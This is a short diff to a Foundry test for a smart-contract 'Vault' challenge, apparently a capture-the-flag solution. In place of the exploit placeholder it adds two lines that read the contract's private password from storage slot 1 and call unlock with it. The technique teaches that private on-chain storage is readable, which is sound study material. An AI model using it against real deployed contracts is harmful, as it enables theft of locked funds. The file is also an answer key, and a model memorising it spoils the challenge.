@@ -16,7 +16,8 @@ contract TestVault is Test {
     function testSolution() public {
         vm.startPrank(player);
 
-        // Your exploit goes here
+        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));
+        instance.unlock(password);
 
         assertFalse(instance.locked());
 
